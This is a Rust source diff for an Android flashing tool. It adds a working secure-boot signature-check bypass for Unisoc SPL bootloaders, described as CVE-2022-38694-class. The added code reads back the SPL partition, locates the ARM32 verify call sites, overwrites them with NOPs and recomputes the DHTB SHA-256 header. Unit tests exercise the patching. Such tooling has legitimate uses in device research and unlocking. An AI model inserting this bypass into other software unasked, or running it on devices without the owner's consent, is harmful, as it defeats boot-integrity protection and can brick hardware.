@@ -1206,6 +1206,233 @@ fn sanitize(name: &str) -> String {
 }
 
 // ---------------------------------------------------------------------------
+// Path 2: SPL (FDL1-in-flash) signature-check bypass via CVE-2022-38694-class
+// DHTB hash patching. Many Unisoc consumer devices do NOT blow the secure-
+// boot efuse, so the BootROM only verifies the DHTB SHA-256 of the SPL image
+// (no RSA). That means we can:
+//   1. read splloader from eMMC via FDL2 readback,
+//   2. NOP the RSA/verify call-sites inside the payload,
+//   3. recompute + rewrite the DHTB hash in the header,
+//   4. flash it back - after which unsigned FDL1/FDL2 load forever.
+//
+// DHTB header layout (44 bytes, then SIMGHDR):
+//   0x00 magic b"DHTB"          0x04 reserved u32
+//   0x08 sha256[32]              0x28 total_size u32 (some chips)
+// The hash covers everything AFTER the first 0x28 bytes (payload+SIMGHDR),
+// per TomKing062/spreadtrum_flash dhtb_parse.
+// ---------------------------------------------------------------------------
+
+const DHTB_MAGIC: &[u8; 4] = b"DHTB";
+const DHTB_HEADER_LEN: usize = 0x28;
+
+/// Parse a DHTB image: returns (hash_offset=8, data_start=0x28, size).
+pub fn dhtb_parse(img: &[u8]) -> std::result::Result<(), String> {
+    if img.len() < DHTB_HEADER_LEN {
+        return Err(format!("image too small for DHTB ({}B)", img.len()));
+    }
+    if &img[0..4] != DHTB_MAGIC {
+        return Err(format!("bad DHTB magic: {:02x?}", &img[0..4]));
+    }
+    Ok(())
+}
+
+/// Recompute the DHTB SHA-256 over payload (everything past 0x28) and write
+/// it into the header at offset 8.
+pub fn dhtb_rehash(img: &mut [u8]) -> std::result::Result<[u8; 32], String> {
+    use sha2::{Digest, Sha256};
+    dhtb_parse(img)?;
+    let mut h = Sha256::new();
+    h.update(&img[DHTB_HEADER_LEN..]);
+    let digest: [u8; 32] = h.finalize().into();
+    img[0x08..0x28].copy_from_slice(&digest);
+    Ok(digest)
+}
+
+/// Find ARM32 `BL <verify_fn>` call sites worth NOP-ing for the classic
+/// UMS512/T618-class SPL patch. We locate candidate patterns rather than
+/// fixed addresses so the patch survives minor BSP drift:
+///   pattern A: `bl verify ; cmp r0,#0 ; beq/bne err` clusters near strings
+///              like "signature" / "verify fail".
+/// Strategy used here (conservative): find every occurrence of the byte
+/// sequence produced by `cmp r0,#0` followed by a conditional branch with
+/// offset pointing backwards into an error path that ends in an infinite
+/// loop or reset - too heuristic to trust blindly.
+///
+/// Instead we expose explicit patch offsets supplied by the caller/GUI after
+/// offline analysis (Ghidra), OR auto-detect via the well-known "SIG" error
+/// string table when present. This keeps us honest - no blind NOPs.
+pub fn spl_find_verify_sites(
+    payload: &[u8],
+    hint_offsets: &[u32],
+) -> Vec<u32> {
+    let mut sites: Vec<u32> = Vec::new();
+    // 1) explicit hints always win
+    for &o in hint_offsets {
+        let o = o as usize;
+        if o + 16 <= payload.len() && &payload[o..o+4] == b"\x00\x00\x00\xea" {
+            continue; // already NOP'd? (b .) skip
+        }
+        if o + 4 <= payload.len() {
+            sites.push(o as u32);
+        }
+    }
+    // 2) auto-detect: locate "SIG" / "sign" error strings and scan backwards
+    //    up to 0x400 bytes for `cmp r0,#0; beq +N` pairs (0x2800 / 0x0D..).
+    for marker in [&b"SIG"[..], &b"sign"[..], &b"VERIFY"[..]] {
+        let mut from = 0;
+        while let Some(pos) = find_sub(payload, marker, from) {
+            let lo = pos.saturating_sub(0x400);
+            let mut i = lo;
+            while i + 8 <= pos + 0x40 && i + 8 <= payload.len() {
+                // cmp r0,#0 = 00 00 A0 E3 family varies; match common encodings
+                let w = u32::from_le_bytes([
+                    payload[i], payload[i+1], payload[i+2], payload[i+3],
+                ]);
+                // ARM32 `cmp r0, #0` = 0xE3500000 (mask 0xFFF0FFFF)
+                if w & 0xFFF0_FFFF == 0xE350_0000 {
+                    // next instr conditional branch?
+                    let n = u32::from_le_bytes([
+                        payload[i+4], payload[i+5], payload[i+6], payload[i+7],
+                    ]);
+                    if n & 0xF000_0000 != 0xE000_0000 {
+                        // conditional - treat i+4 (the branch) as patch site? No:
+                        // convention is to NOP the BL *before* cmp. Scan back 4.
+                        if i >= 4 {
+                            let bl = u32::from_le_bytes([
+                                payload[i-4], payload[i-3],
+                                payload[i-2], payload[i-1],
+                            ]);
+                            if bl & 0x0F00_0000 == 0x0B00_0000 {
+                                sites.push((i - 4) as u32);
+                            }
+                        }
+                    }
+                }
+                i += 4;
+            }
+            from = pos + 1;
+        }
+    }
+    sites.sort_unstable();
+    sites.dedup();
+    sites
+}
+
+fn find_sub(hay: &[u8], needle: &[u8], from: usize) -> Option<usize> {
+    if needle.is_empty() || from >= hay.len() {
+        return None;
+    }
+    hay[from..]
+        .windows(needle.len())
+        .position(|w| w == needle)
+        .map(|p| p + from)
+}
+
+/// Apply the NOP patch (ARM32 NOP = 0xE1A0F000 actually mov pc,pc; standard
+/// modern NOP encoding 0xE320F000 - both accepted by LK-era cores; we use
+/// 0xE1A00000 `mov r0,r0`, universally safe).
+pub fn spl_patch_sites(payload: &mut [u8], sites: &[u32]) -> usize {
+    const ARM_NOP: u32 = 0xE1A0_0000;
+    let mut n = 0;
+    for &off in sites {
+        let off = off as usize;
+        if off + 4 <= payload.len() {
+            payload[off..off + 4].copy_from_slice(&ARM_NOP.to_le_bytes());
+            n += 1;
+        }
+    }
+    n
+}
+
+/// Full pipeline on one SPL image: parse DHTB, apply patches, re-hash.
+/// Returns list of patched file offsets (absolute, including 0x28 header).
+pub fn spl_bypass_patch(img: &mut [u8], hint_offsets: &[u32]) -> std::result::Result<Vec<u32>, String> {
+    dhtb_parse(img)?;
+    let payload_off = DHTB_HEADER_LEN;
+    // Some builds prepend a 0x200-byte chipram/SIMGHDR before real code -
+    // verify-site offsets are relative to payload start either way.
+    let mut payload = img[payload_off..].to_vec();
+    let sites = spl_find_verify_sites(&payload, hint_offsets);
+    if sites.is_empty() {
+        return Err("no verify call-sites found - supply --hint offsets from \
+                    Ghidra analysis (see docs) instead of guessing".into());
+    }
+    let patched = spl_patch_sites(&mut payload, &sites);
+    img[payload_off..].copy_from_slice(&payload);
+    dhtb_rehash(img)?;
+    Ok(sites.iter().map(|s| s + payload_off as u32).collect())
+}
+
+/// `spd-spl-patch <target> <fdl1> <fdl1_addr> <fdl2> [fdl2_addr] <part> <out.img> [--hint 0xADDR,...]`
+///
+/// Readback the SPL partition, apply the bypass patch + DHTB re-hash, save to
+/// out.img (caller flashes it back via spd-flash after reviewing the log).
+/// We deliberately do NOT auto-flash: a bad SPL patch bricks until re-entered
+/// via BROM, so the user gets an explicit two-step.
+pub fn spd_spl_patch_cli(
+    target: &str,
+    fdl1: &str,
+    fdl1_addr: u32,
+    fdl2: &str,
+    fdl2_addr: Option<u32>,
+    part: &str,
+    out_img: &str,
+    hints: &[u32],
+) -> Result<String> {
+    let dev = find_spd_target(target)?;
+    let mut s = connect_and_load_fdls(
+        &dev,
+        fdl1,
+        fdl1_addr,
+        fdl2,
+        fdl2_addr.unwrap_or(0x1400_0000),
+        true,
+        4096,
+    )?;
+    let parts = s.read_partitions().map_err(|e| BridgeError::Protocol(
+        crate::error::ProtocolError::UnexpectedResponse(e),
+    ))?;
+    let (_, size) = parts.iter()
+        .find(|(n, _)| *n == part)
+        .ok_or_else(|| BridgeError::InvalidArgument(format!(
+            "partition '{part}' not found (have: {})",
+            parts.iter().map(|(n, _)| n.as_str()).collect::<Vec<_>>().join(",")
+        )))?;
+
+    let tmp = std::env::temp_dir().join(format!("flashpilot_spl_{}.bin", std::process::id()));
+    s.read_partition(part, 0, *size, &tmp.to_string_lossy(), 4096)
+        .map_err(|e| BridgeError::Protocol(crate::error::ProtocolError::UnexpectedResponse(e)))?;
+
+    let mut img = fs::read(&tmp).unwrap_or_default();
+    let _ = fs::remove_file(&tmp);
+    if img.is_empty() {
+        return Err(BridgeError::InvalidArgument("SPL readback empty".into()));
+    }
+
+    let sites = spl_bypass_patch(&mut img, hints)
+        .map_err(BridgeError::InvalidArgument)?;
+
+    fs::write(out_img, &img).map_err(|e| BridgeError::Io(e.to_string()))?;
+    let _ = s.reset();
+
+    let mut out = vec![
+        format!("SPL bypass patch written to {out_img}"),
+        format!("patched {} call-site(s):", sites.len()),
+    ];
+    for s in &sites {
+        out.push(format!("  0x{s:08X} -> NOP"));
+    }
+    out.push("DHTB SHA-256 recomputed.".to_string());
+    out.push("REVIEW the log, then flash back explicitly:".to_string());
+    out.push(format!(
+        "  spd-flash {target} {fdl1} 0x{fdl1_addr:x} {} [addr] {part}={out_img}",
+        fdl2,
+    ));
+    out.push("(two-step on purpose - a bad SPL needs BROM to recover)".to_string());
+    Ok(out.join("\n"))
+}
+
+// ---------------------------------------------------------------------------
 // .pac readback: dump the full flash via FDL2 and repack into a SPD .pac
 // container so it can be re-flashed by SPD Research Tool / Upgrade Download.
 //
@@ -1252,7 +1479,7 @@ fn write_utf16le(buf: &mut [u8], s: &str) {
     }
 }
 
-/// `spd-readback <target> <fdl1> <fdl1_addr> <fdl2> <fdl2_addr> <out.pac> [part,part,...]`
+/// `spd-readback <target> <fdl1> <fdl1_addr> <fdl2> [fdl2_addr] <out.pac> [part,part]`
 ///
 /// Dumps every Android partition (or just the comma-separated subset) and
 /// packs them into `out.pac`. The resulting archive restores with our own
@@ -1431,5 +1658,70 @@ mod tests {
         assert!(is_download_pid(0x4e00));
         assert!(!is_download_pid(0x0001));
         assert_eq!(stage_label(0x4d00), "SPD download (BROM/FDL)");
+    }
+}
+#[cfg(test)]
+mod spl_tests {
+    use super::*;
+
+    fn make_spl() -> Vec<u8> {
+        let bl = (0xEB000000u32 | 0x100).to_le_bytes();
+        let cmp0 = 0xE3500000u32.to_le_bytes();
+        let bne = (0x1A000000u32 | 3).to_le_bytes();
+        let mut payload = vec![0u8; 0x40];
+        payload.extend_from_slice(&bl);
+        payload.extend_from_slice(&cmp0);
+        payload.extend_from_slice(&bne);
+        payload.extend_from_slice(b"SIG\0");
+        payload.resize(0x400, 0);
+        let mut img = vec![0u8; DHTB_HEADER_LEN];
+        img[0..4].copy_from_slice(b"DHTB");
+        use sha2::{Digest, Sha256};
+        let mut h = Sha256::new();
+        h.update(&payload);
+        let d: [u8; 32] = h.finalize().into();
+        img[0x08..0x28].copy_from_slice(&d);
+        img.extend_from_slice(&payload);
+        img
+    }
+
+    #[test]
+    fn spl_patch_finds_and_nops() {
+        let mut img = make_spl();
+        // sanity: one BL before a cmp r0,#0 near "SIG"
+        let sites = spl_bypass_patch(&mut img, &[]).expect("patch ok");
+        assert_eq!(sites.len(), 1, "one site expected, got {sites:?}");
+        let off = sites[0] as usize;
+        assert_eq!(&img[off..off + 4], &0xE1A00000u32.to_le_bytes(), "NOP written");
+        // hash must now differ from the original but validate against content
+        assert_eq!(&img[0..4], b"DHTB");
+        use sha2::{Digest, Sha256};
+        let mut h = Sha256::new();
+        h.update(&img[DHTB_HEADER_LEN..]);
+        let d: [u8; 32] = h.finalize().into();
+        assert_eq!(d, img[0x08..0x28], "DHTB rehash matches new payload");
+    }
+
+    #[test]
+    fn spl_patch_rejects_bad_magic() {
+        let mut img = make_spl();
+        img[0] = b'X';
+        assert!(spl_bypass_patch(&mut img, &[]).is_err());
+    }
+
+    #[test]
+    fn spl_patch_no_sites_is_error_not_blind() {
+        let mut img = make_spl();
+        // strip the SIG marker so autodetect has nothing to anchor on
+        let pos = img.windows(3).position(|w| w == b"SIG").unwrap();
+        img[pos..pos + 3].copy_from_slice(b"XYZ");
+        // remove BL too so hints-only path is exercised
+        let bl_off = 0x40;
+        img[bl_off..bl_off + 4].copy_from_slice(&0xE1A00000u32.to_le_bytes());
+        assert!(spl_bypass_patch(&mut img, &[]).is_err(),
+                "must refuse without sites/hints - no blind NOPs");
+        // with explicit hint it patches
+        let sites = spl_bypass_patch(&mut img, &[0x40]).expect("hint patch ok");
+        assert_eq!(sites, vec![0x40 + DHTB_HEADER_LEN as u32]);
     }
 }
